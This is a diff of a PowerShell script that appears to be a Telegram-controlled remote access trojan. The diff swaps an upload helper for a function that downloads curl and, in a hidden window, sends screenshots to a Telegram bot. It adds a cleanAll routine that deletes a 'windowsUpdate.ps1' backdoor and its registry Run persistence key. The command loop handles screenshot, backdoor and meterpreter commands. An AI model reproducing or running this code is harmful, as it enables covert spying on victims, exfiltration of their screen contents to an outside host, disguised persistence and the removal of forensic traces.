@@ -53,59 +53,37 @@ function screenshot {
            $graphics.Dispose()
            $bmp.Dispose()
         }
-
         $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
         screenshot $bounds "C:\Users\afranco\Documents\screenshot.jpg"
 }
 
-function upload {
-Param ( 
-        [Parameter(Position = 0)]
-        $url,
-
-        [Parameter(Position = 1)]
-        $filepath,
-
-        [Parameter(Position = 2)]
-        $name
-
-        )
-
-        $boundary = [guid]::NewGuid().ToString()   #Declaring boundary
-
-        #headers
-        $headers = @{"Cache-Control"="no-cache"
-        "Accept-Encoding"= "gzip"
-        "Accept"="text/html, application/xhtml+xml, image/jxr, */*"
-        "Accept-Language"="en-US"
-        }
-
-        #Converting file to bytes/ Encoding to utf-8
-        $filebytearray = [System.IO.File]::ReadAllBytes($filepath)
-        $enc = [System.Text.Encoding]::GetEncoding('utf-8')
-        $filebodytemplate = $enc.GetString($filebytearray)
-
-
-        #writing body
-        $contents = New-Object System.Text.StringBuilder
-        $contents.AppendLine()
-        $contents.AppendLine("--$boundary")
-        $contents.AppendLine("Content-Dis-data; name=""uploaded_file""; filename=""$name""")
-        $contents.AppendLine("Content-Type: application/x-zip-compressed")
-        $contents.AppendLine()
-        $contents.AppendLine($filebodytemplate)
-        $contents.AppendLine("--$boundary--")
-        $template = $contents.ToString()
-
-Invoke-RestMethod -Uri $url -Method Post  -ContentType "multipart/form-data;boundary=$boundary" -Body $template -Headers $headers
-
+function cleanAll {
+    # Remove screenshots
+    rm C:\Users\$env:USERPROFILE\Documents\screenshot.jpg
+    # Remove cUrl
+    rm C:\Users\$env:USERPROFILE\AppData\Local\Temp\1
+    # Remove backdoor
+    rm C:\Users\$env:USERPROFILE\Documents\windowsUpdate.ps1
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
 }
 
-function cleanall {
-    rm C:\Users\afranco\Documents\screenshot.jpg
-    rm C:\Users\afranco\Documents\windowsUpdate.ps1
+function sendPhoto {
+    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
+    $photo = "C:\Users\afranco\Documents\screenshot.jpg"
+    $ruta = $env:USERPROFILE + "\appdata\local\temp\1"
+    $curl_zip = $ruta + "\curl.zip"
+    $curl = $ruta + "\" + "curl.exe"
+    $curl_mod = $ruta + "\" + "curl_mod.exe"
+    if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
+    if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
+    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
+    [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
+    }
+    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
+    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
+    
+    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
 }
-
 
 #####################
 ## BYPASS POLICIES ##
@@ -227,18 +205,16 @@ While ($DoNotExit)  {
       }
       "/screenshot $ipV4"{
         screenshot
-        $filepath = 'C:\Users\afranco\Documents\screenshot.jpg'
-        $url = "https://api.telegram.org/bot$($BotToken)/sendPhoto?chat_id=$($ChatID)"
-        $name = "test"
-        upload($url, $filepath, $name)
-        #Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendPhoto?chat_id=$($ChatID)" -ContentType 'multipart/form-data' -Method Post -InFile $FileContent;
-        
+        sendPhoto
       }
       "/backdoor $ipV4"  {
         backdoor
       }
       "/meterpreter $ipV4"  {
          
+      }
+      "/cleanAll $ipV4" {
+        cleanAll
       }
 	  default  {
 	    #The message sent is unknown
